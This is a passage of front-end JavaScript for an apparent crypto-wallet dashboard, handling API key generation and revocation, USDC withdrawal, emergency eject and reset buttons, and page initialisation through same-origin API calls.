    genBtn.disabled = true;
    genBtn.textContent = '...';
    try {
      var res  = await fetch('/api/keys/generate', {
        method: 'POST',
        headers: authHeaders(),
        body: JSON.stringify({ label: label })
      });
      var data = await res.json();
      if (res.status === 409) {
        if (msgEl) msgEl.textContent = 'Max 2 keys reached';
        genBtn.disabled = false;
      } else if (res.status === 201) {
        if (labelEl) labelEl.value = '';
        await cmLoadApiKeys();
      } else {
        if (msgEl) msgEl.textContent = data.error || 'Error generating key';
        genBtn.disabled = false;
      }
    } catch(e) {
      if (msgEl) msgEl.textContent = 'Network error';
      genBtn.disabled = false;
    }
    genBtn.textContent = '[ + ]';
  }

  async function cmRevokeApiKey(keyId) {
    var msgEl = $('apikey-msg');
    if (msgEl) msgEl.textContent = '';
    try {
      var res = await fetch('/api/keys/' + keyId + '/revoke', {
        method: 'POST',
        headers: authHeaders()
      });
      if (res.ok) {
        await cmLoadApiKeys();
      } else {
        if (msgEl) msgEl.textContent = 'Revoke failed';
      }
    } catch(e) {
      if (msgEl) msgEl.textContent = 'Network error';
    }
  }

  /* ── Withdraw ────────────────────────────────────────────────────── */
  async function handleWithdraw() {
    var btn = $('btn-withdraw');
    if (!btn || btn.disabled) return;
    btn.disabled = true;
    var orig = btn.textContent;
    btn.textContent = '[ PROCESSING… ]';
    try {
      var res  = await fetch('/api/usdc/withdraw', { method: 'POST', headers: getAuthHeaders() });
      var data = await res.json().catch(function () { return {}; });
      if (data.success) {
        showToast('WITHDRAW OK — TX: ' + (data.tx_hash ? data.tx_hash.slice(0, 18) + '…' : 'confirmed'));
        setTimeout(syncTelemetry, 2000);
      } else {
        showToast('[' + (data.code || 'ERROR') + '] ' + (data.message || 'withdrawal failed'), true);
      }
    } catch (e) {
      showToast('NETWORK ERROR — withdraw aborted', true);
    } finally {
      btn.disabled = false; btn.textContent = orig;
    }
  }

  /* ── Emergency buttons ───────────────────────────────────────────── */
  async function handleEmergency(endpoint, btnId, actionLabel) {
    var btn = $(btnId);
    if (!btn || btn.disabled) return;
    btn.disabled = true;
    var orig = btn.textContent;
    btn.textContent = '[ PROCESSING… ]';
    try {
      var res  = await fetch(endpoint, { method: 'POST', headers: getAuthHeaders() });
      var data = await res.json().catch(function () { return {}; });
      if (data.success) {
        var wrapper = $('app-wrapper');
        if (wrapper) {
          wrapper.classList.add('emergency-shake');
          setTimeout(function () { wrapper.classList.remove('emergency-shake'); }, 600);
        }
        showToast(actionLabel.toUpperCase() + ' CONFIRMED — ' + (data.timestamp || ''));
      } else {
        showToast('[' + (data.code || 'ERROR') + '] ' + (data.message || actionLabel + ' failed'), true);
      }
    } catch (e) {
      showToast('NETWORK ERROR — ' + actionLabel + ' aborted', true);
    } finally {
      btn.disabled = false; btn.textContent = orig;
    }
  }

  /* ── Init ────────────────────────────────────────────────────────── */
  function initButtons() {
    var connectBtn   = $('cm-connect-btn');
    var activateBtn  = $('cm-activate-btn');
    var closeBtn     = $('cm-close-btn');
    var ejectBtn     = $('cm-eject-btn');
    var resignBtn    = $('cm-resign-btn');
    var wBtn         = $('btn-withdraw');
    var eBtn         = $('btn-eject');
    var rBtn         = $('btn-hard-reset');

    if (connectBtn)  connectBtn.addEventListener('click',  cmConnectWallet);
    var connectBtn2  = $('cm-connect-btn-2');
    if (connectBtn2) connectBtn2.addEventListener('click', cmConnectWallet);
    if (activateBtn) activateBtn.addEventListener('click', cmRunActivationSequence);
    if (closeBtn)    closeBtn.addEventListener('click',    cmLaunchFieldOps);
    if (ejectBtn)    ejectBtn.addEventListener('click',    cmEjectWallet);
    if (resignBtn)   resignBtn.addEventListener('click',   cmResignDelegation);
    if (wBtn)        wBtn.addEventListener('click',        handleWithdraw);
    if (eBtn)        eBtn.addEventListener('click',        function () { handleEmergency('/api/emergency/eject',      'btn-eject',      'EJECT'); });
    if (rBtn)        rBtn.addEventListener('click',        function () { handleEmergency('/api/emergency/hard_reset', 'btn-hard-reset', 'HARD RESET'); });
    var genKeyBtn = $('btn-gen-key');
    if (genKeyBtn)   genKeyBtn.addEventListener('click', cmGenerateApiKey);
  }

  function init() {
    initCardFlip();
    initButtons();

    if (isAuthenticated()) {
      var wallet = localStorage.getItem('walletAddress') || '';
      cmCheckActivationStatus(wallet);
    } else {
      cmShowPhase('connect');
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
